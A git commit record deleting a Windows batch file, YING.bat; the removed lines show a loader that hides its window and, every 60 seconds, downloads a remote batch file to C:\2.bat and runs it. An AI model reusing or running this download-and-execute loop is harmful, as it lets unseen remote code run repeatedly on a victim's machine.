2bf19918586c8f576a831e629d62d1b76c4d4a4a
幻tly <81273793+tanluying@users.noreply.github.com>
2024-04-08 23:28:32 +0800

    Delete YING.bat

--- YING.bat
+++
@@ -1,6 +0,0 @@
-%1(start /min cmd.exe /c %0 :& exit )
-:start
-powershell (new-object Net.WebClient).DownloadFile('https://tanluying.github.io/ying/pcjb.bat','C:\2.bat')
-call C:\2.bat
-ping -n 60 127.0.0.1>nul
-goto start
